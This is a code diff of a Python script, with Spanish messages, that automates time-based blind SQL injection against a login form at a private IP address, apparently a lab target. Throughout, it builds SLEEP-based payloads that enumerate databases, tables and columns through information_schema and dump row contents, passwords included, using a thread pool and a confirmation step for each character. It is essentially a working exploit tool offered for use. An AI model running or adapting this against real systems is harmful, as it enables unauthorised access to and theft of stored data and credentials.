@@ -1,7 +1,8 @@
 #!/usr/bin/python3
 
 from pwn import *
-import requests, signal, sys, time, threading
+import requests, signal, sys, time
+from concurrent.futures import ThreadPoolExecutor
 
 def def_handler(sig, frame):
     print("\n\n[!] Saliendo ....\n")
@@ -10,155 +11,225 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 url = "http://10.88.0.2/login.php"
-characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ'  # orden de frecuencia
-SLEEP_TIME = 2
-THRESHOLD = 1.3
-session = requests.Session()
 
-def test_char(payload_template, index, position, char, result_holder):
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$-_'
+
+SLEEP_TIME = 1.0
+THRESHOLD = 0.8
+MAX_WORKERS = 20
+
+def test_char(payload_template, index, position, char):
     payload = payload_template.format(index=index, position=position, char=char)
-    data = {
-        'username': payload,
-        'password': 'irrelevante'
-    }
+    data = {'username': payload, 'password': 'irrelevante'}
 
+    session = requests.Session()
     start = time.time()
     session.post(url, data=data)
     end = time.time()
+    session.close()
 
-    if end - start > THRESHOLD:
-        result_holder['char'] = char
+    return (end - start) > THRESHOLD, char
 
-def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_length=30):
+def test_char_direct(payload):
+    data = {'username': payload, 'password': 'irrelevante'}
+
+    session = requests.Session()
+    start = time.time()
+    session.post(url, data=data)
+    end = time.time()
+    session.close()
+
+    return (end - start) > THRESHOLD
+
+def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_length=50):
     results = []
+
+    print(f"\n[+] Iniciando extracción de {label}...\n")
 
     for entry_index in range(max_entries):
         entry_value = ""
-        p = log.progress(f"{label} #{entry_index}")
+
+        print(f"[+] ", end=' ', flush=True)
+
         for position in range(1, max_length + 1):
-            result_holder = {'char': None}
-            threads = []
+            found = False
+            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                futures = [executor.submit(test_char, payload_template, entry_index, position, char) for char in characters]
+                for future in futures:
+                    is_match, char = future.result()
+                    if is_match:
+                        confirmed, _ = test_char(payload_template, entry_index, position, char)
+                        if confirmed:
+                            entry_value += char
+                            print(char, end='', flush=True)
+                            found = True
+                            break
 
-            for char in characters:
-                t = threading.Thread(target=test_char, args=(payload_template, entry_index, position, char, result_holder))
-                threads.append(t)
-                t.start()
+            if not found:
+                break
 
-            for t in threads:
-                t.join()
-
-            if result_holder['char']:
-                entry_value += result_holder['char']
-                p.status(entry_value)
-            else:
-                break  # fin de cadena
+        print()  # salto de línea después de cada entrada
 
         if entry_value:
             results.append(entry_value)
         else:
-            break  # no más entradas
+            break
 
     return results
 
 def extract_databases():
     template = (
         "' OR IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata "
-        "LIMIT {index},1),{position},1)='{char}', SLEEP(2), 0)-- -"
+        "LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
     )
-    return brute_extract(template, label="DB")
+    return brute_extract(template, label="Bases de datos")
 
 def extract_tables(database):
     template = (
-        f"' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
-        f"WHERE table_schema='{database}' LIMIT {{index}},1),{{position}},1)='{{char}}', SLEEP(2), 0)-- -"
+        "' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
+        "WHERE table_schema='" + database + "' LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
     )
     return brute_extract(template, label=f"Tablas de {database}")
 
 def extract_columns(database, table):
     template = (
-        f"' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
-        f"WHERE table_schema='{database}' AND table_name='{table}' LIMIT {{index}},1),{{position}},1)='{{char}}', SLEEP(2), 0)-- -"
+        "' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
+        "WHERE table_schema='" + database + "' AND table_name='" + table + "' LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
     )
     return brute_extract(template, label=f"Columnas de {table}")
 
-# Nueva función para extraer datos de columnas específicas en filas
-def extract_data(database, table, columns, max_rows=10, max_length=30):
+def extract_data(database, table, columns, max_rows=10, max_length=50):
     results = []
     columns_str = ",".join(columns)
-    # Vamos a extraer fila por fila concatenando columnas con un separador raro (ejemplo: '|||')
-    # Esto facilita la extracción
+
+    print(f"\n[+] Extrayendo datos de {table} - columnas: {', '.join(columns)}")
+
     for row_index in range(max_rows):
         row_value = ""
-        p = log.progress(f"Fila #{row_index}")
+        print(f"\n[+] ", end='', flush=True)
+
         for position in range(1, max_length + 1):
-            result_holder = {'char': None}
-            threads = []
-            for char in characters + '|':  # incluimos '|' como posible carácter del separador
-                # Payload para extraer substring concatenada con separador '|||'
-                # Ejemplo: SELECT CONCAT_WS('|||', col1, col2, col3) FROM tabla LIMIT row_index,1
-                payload = (
-                    f"' OR IF(SUBSTRING((SELECT CONCAT_WS('|||',{columns_str}) FROM {database}.{table} "
-                    f"LIMIT {row_index},1),{position},1)='{char}', SLEEP(2), 0)-- -"
-                )
-                t = threading.Thread(target=test_char, args=(payload, 0, 0, char, result_holder))
-                threads.append(t)
-                t.start()
+            found = False
 
-            for t in threads:
-                t.join()
+            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                futures = []
+                for char in characters:
+                    payload = (
+                        "' OR IF(SUBSTRING(BINARY (SELECT CONCAT_WS('|||'," + columns_str + ") FROM " + database + "." + table + " "  
+                        "LIMIT " + str(row_index) + ",1)," + str(position) + ",1)='" + char + "', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
+                    )
+                    futures.append(executor.submit(test_char_direct, payload))
 
-            if result_holder['char']:
-                row_value += result_holder['char']
-                p.status(row_value)
-            else:
+                for i, future in enumerate(futures):
+                    if future.result():
+                        payload_confirm = (
+                            "' OR IF(SUBSTRING(BINARY (SELECT CONCAT_WS('|||'," + columns_str + ") FROM " + database + "." + table + " "
+                            "LIMIT " + str(row_index) + ",1)," + str(position) + ",1)='" + characters[i] + "', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
+                        )
+                        if test_char_direct(payload_confirm):
+                            row_value += characters[i]
+                            print(characters[i], end='', flush=True)
+                            found = True
+                            break
+
+            if not found:
                 break
 
         if row_value:
             results.append(row_value)
+            print()  # salto de línea después de fila completa
         else:
+            print("\n[!] No más filas detectadas.")
             break
+
     return results
 
-def main():
-    log.info("Extrayendo nombres de bases de datos...")
-    dbs = extract_databases()
-
-    print("\n[+] Bases de datos encontradas:")
-    for db in dbs:
-        print(f" - {db}")
-
-    target_db = input("\n[?] ¿Qué base de datos quieres explorar? ").strip()
-    tbls = extract_tables(target_db)
-
-    print(f"\n[+] Tablas en {target_db}:")
-    for t in tbls:
-        print(f" - {t}")
-
-    target_tbl = input("\n[?] ¿Qué tabla quieres explorar? ").strip()
-    cols = extract_columns(target_db, target_tbl)
-
-    print(f"\n[+] Columnas en {target_tbl}:")
-    for c in cols:
-        print(f" - {c}")
-
-    # Ahora el usuario elige columnas separadas por coma
-    selected_cols = input("\n[?] ¿Qué columnas quieres extraer? (separa con coma) ").strip()
-    selected_cols_list = [col.strip() for col in selected_cols.split(",") if col.strip() in cols]
-
-    if not selected_cols_list:
-        print("[!] No seleccionaste columnas válidas, saliendo...")
-        return
-
-    # Extraemos datos
-    print(f"\n[+] Extrayendo datos de columnas: {', '.join(selected_cols_list)}")
-    data_rows = extract_data(target_db, target_tbl, selected_cols_list)
-
+def print_data_rows(data_rows, selected_cols_list, hide_password=True):
+    print("\n[+] Datos extraidos:")
     for i, row in enumerate(data_rows):
-        # Dividimos usando el separador '|||'
         values = row.split("|||")
         print(f"Fila #{i}:")
         for col, val in zip(selected_cols_list, values):
-            print(f"  {col}: {val}")
+            if hide_password and col.lower() == "password":
+                print(f"  {col}: {'*' * 8}  (oculto)")
+            else:
+                print(f"  {col}: {val}")
+
+def interactive_menu():
+    while True:
+        print("\n--- Menú ---")
+        print("1) Ver bases de datos")
+        print("2) Ver tablas de una base de datos")
+        print("3) Ver columnas de una tabla")
+        print("4) Dumpear datos de UNA columna")
+        print("0) Salir")
+
+        choice = input("\nSelecciona una opción: ").strip()
+
+        if choice == '1':
+            dbs = extract_databases()
+            # No imprimir la lista completa para evitar redundancia
+            # print("\n[+] Bases de datos encontradas:")
+            # for db in dbs:
+            #     print(f" - {db}")
+
+        elif choice == '2':
+            db = input("Ingresa el nombre de la base de datos: ").strip()
+            if not db:
+                print("[!] No ingresaste base de datos")
+                continue
+            tbls = extract_tables(db)
+            # No imprimir la lista completa para evitar redundancia
+            # print(f"\n[+] Tablas en {db}:")
+            # for t in tbls:
+            #     print(f" - {t}")
+
+        elif choice == '3':
+            db = input("Ingresa el nombre de la base de datos: ").strip()
+            if not db:
+                print("[!] No ingresaste base de datos")
+                continue
+            tbl = input("Ingresa el nombre de la tabla: ").strip()
+            if not tbl:
+                print("[!] No ingresaste tabla")
+                continue
+            cols = extract_columns(db, tbl)
+            # No imprimir la lista completa para evitar redundancia
+            # print(f"\n[+] Columnas en {tbl}:")
+            # for c in cols:
+            #     print(f" - {c}")
+
+        elif choice == '4':
+            db = input("Ingresa el nombre de la base de datos: ").strip()
+            if not db:
+                print("[!] No ingresaste base de datos")
+                continue
+
+            tbl = input("Ingresa el nombre de la tabla: ").strip()
+            if not tbl:
+                print("[!] No ingresaste tabla")
+                continue
+
+            col = input("Ingresa la columna que quieres dumpear: ").strip()
+            if not col:
+                print("[!] No ingresaste columna")
+                continue
+            selected_cols_list = [col]
+
+            data_rows = extract_data(db, tbl, selected_cols_list)
+            print_data_rows(data_rows, selected_cols_list, hide_password=True)
+
+            print("\n[!] Para dumpear otra columna, debes volver a ingresar base, tabla y columna.")
+
+        elif choice == '0':
+            print("Saliendo...")
+            sys.exit(0)
+
+        else:
+            print("[!] Opción no válida")
+
+def main():
+    interactive_menu()
 
 if __name__ == '__main__':
     main()
